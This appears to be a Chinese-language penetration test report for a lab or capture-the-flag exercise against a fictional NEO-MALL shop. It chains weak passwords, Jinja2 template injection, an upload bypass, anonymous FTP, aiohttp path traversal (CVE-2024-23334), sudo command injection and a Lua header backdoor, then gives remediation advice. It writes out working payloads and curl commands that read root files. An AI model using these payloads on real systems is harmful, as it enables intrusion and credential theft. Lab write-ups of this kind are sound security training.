# 專業滲透測試報告：NEO-MALL 企業級環境 (SSTI 漏洞鏈版)

## 1. 執行摘要 (Executive Summary)
本報告詳述了針對 NEO-MALL 企業級電商系統進行的連鎖漏洞滲透測試。我們捨棄了需要人工互動的 XSS 模擬，改為實作技術難度更高且具備「即時回饋」特性的 **SSTI (伺服器端模板注入)** 漏洞。透過串聯弱口令、SSTI、不安全上傳與核心的 CVE-2024-23334 漏洞，攻擊者可在無需管理員互動的情況下，達成全系統的權限控制。

## 2. 漏洞鏈 (Attack Chain)

### 第一階段：身分突破 (Initial Foothold)
*   **漏洞類型**：CWE-521 (弱口令)
*   **動作**：利用常見測試帳號進行登入。
*   **憑據**：`guest / guest123`。
*   **目的**：獲取基本的系統互動權限，以便存取產品評論功能。

### 第二階段：SSTI 模板注入 (Server-Side Template Injection - CWE-1336)
*   **位置**：產品詳情頁面 (`/product/{id}`) 的「產品評論」系統。
*   **漏洞原理**：伺服器使用 Jinja2 引擎來處理評論預覽。開發者為了提供動態排版功能，不安全地將用戶輸入直接傳入模板引擎的渲染函數：`jinja2.Template(user_input).render(config=app_config)`。
*   **測試 Payload**：`{{ 7 * 7 }}` -> 伺服器即時回傳 `49`，確認漏洞存在。

### 第三階段：資訊外洩 (Information Exfiltration)
*   **動作**：利用 SSTI 讀取伺服器配置 (`config`)。
*   **Payload**：`系統維護指令：{{ config['VENDOR_CREDENTIALS'] }}`
*   **即時收穫**：伺服器直接在評論頁面噴出賣家憑據：`{'username': 'neo_vendor', 'password': 'VendorPass8899'}`。
*   **結果**：攻擊者獲得了「賣家」(Seller) 權限。

### 第四階段：不安全的文件上傳 (Insecure File Upload - CWE-434)
*   **位置**：`/seller-portal` (賣家管理中心) 的手冊上傳功能。
*   **繞過手法**：使用 Burp Suite 攔截上傳請求，將檔案的 `Content-Type` 偽造為 `application/pdf`。
*   **關鍵情報**：成功上傳後，後端 API 為了方便開發者調試，在回應中洩漏了文件的**絕對路徑**：`/app/site-c-mall/static/uploads/file.txt`。

### 第四.五階段：FTP 敏感資訊外洩 (FTP Sensitive Data Exposure)
*   **發現**：掃描發現內部測試環境開啟了匿名 FTP 服務 (`port 21`)。
*   **動作**：利用匿名登入 (`anonymous/anonymous`) 存取 `backup_logs` 資料夾。
*   **發現內容**：下載並閱讀 `server_migration.bak`，其中記錄了：「2024年系統安全審計：主要 flag 已移至 /app/config/secret_flag.txt，以避免透過通用靜態路由意外流出。請勿對此資料夾開放權限。」
*   **目的**：精確鎖定 Flag 的位置與檔名，避免在大規模檔案系統中盲目嘗試。

### 第五階段：路徑穿越致命打擊 (Path Traversal - CVE-2024-23334)
*   **核心漏洞**：`aiohttp 3.9.1` 在 `follow_symlinks=True` 的配置下存在路徑遍歷。
*   **利用方式**：結合前一階段獲得的絕對路徑與 FTP 洩漏的檔名，精確計算向上跳轉的層數。
*   **終極 Payload**：
    `curl --path-as-is http://localhost:8080/assets-library/../../app/config/secret_flag.txt`
*   **結果**：成功獲取終極 Flag。

### 第五.五階段：指令注入與動態 Flag 生成 (Command Injection - CWE-77)
*   **位置**：`/seller-portal` (賣家管理中心) 的「系統診斷工具」。
*   **漏洞原理**：系統為了方便賣家排查上傳問題，提供了一個診斷介面。後端使用 `os.popen(command).read()` 直接執行用戶輸入的指令，未進行任何過濾。
*   **動作**：利用此漏洞執行 Flag 生成腳本。該腳本預置於 `/root/flag.sh`，且當前 Web 服務用戶 `neo-user` 具有 sudo 免密碼執行權限。
*   **利用方式**：在診斷工具中輸入 `echo "B11001001" | sudo /root/flag.sh`。
*   **結果**：系統將根據學號動態生成專屬的 User Flag (`/home/neo-user/user_flag.txt`) 與 Root Flag (`/root/root_flag.txt`)。

### 第六階段：跨權限讀取動態 Flag (Deep Path Traversal)
*   **動作**：結合 CVE-2024-23334 漏洞與剛剛生成的檔案路徑，嘗試讀取系統深處的敏感檔案。
*   **讀取 User Flag**：
    `curl --path-as-is http://localhost:8080/assets-library/../../../../home/neo-user/user_flag.txt`
*   **讀取 Root Flag**：
    `curl --path-as-is http://localhost:8080/assets-library/../../../../root/root_flag.txt`
*   **結果**：成功獲取與特定身分關聯的動態 Flag，達成完全的資訊讀取。

### 第七階段：Nginx/Lua 後門 RCE (CWE-94)
*   **漏洞類型**：CWE-94 (程式碼注入)
*   **發現方式**：透過 CVE-2024-23334 讀取 `site-b-dev` 的部署筆記，發現隱藏的偵錯介面。
*   **漏洞原理**：開發者在 OpenResty/Nginx 網關中留下了用於系統診斷的 Lua 後門。該介面直接將 HTTP 標頭 `X-NEO-DEBUG` 的內容傳入 `loadstring()` 並執行，導致嚴重的 RCE。
*   **利用方式**：
    `curl -H "X-NEO-DEBUG: ngx.say(os.execute('whoami'))" http://localhost:8080/api/debug-system`
*   **目的**：在網關層級獲取作業系統控制權，繞過應用程式邏輯。

## 3. 防禦修補建議 (Remediation)
1.  **SSTI**：絕對不可將用戶輸入直接作為模板字串傳入。應使用靜態模板並將用戶輸入作為變數傳遞。
2.  **檔案上傳**：應實施「白名單後綴檢查」與「魔法位元組 (Magic Bytes)」內容檢測，並避免洩漏伺服器內部路徑。
3.  **CVE-2024-23334**：更新 `aiohttp` 套件至 3.9.2+，並將 `follow_symlinks` 設為 `False`（除非絕對必要且路徑安全）。
4.  **Lua 注入**：嚴禁在生產環境中使用 `loadstring()` 執行來自用戶輸入或 HTTP 標頭的內容。應移除所有偵錯用的後門介面。
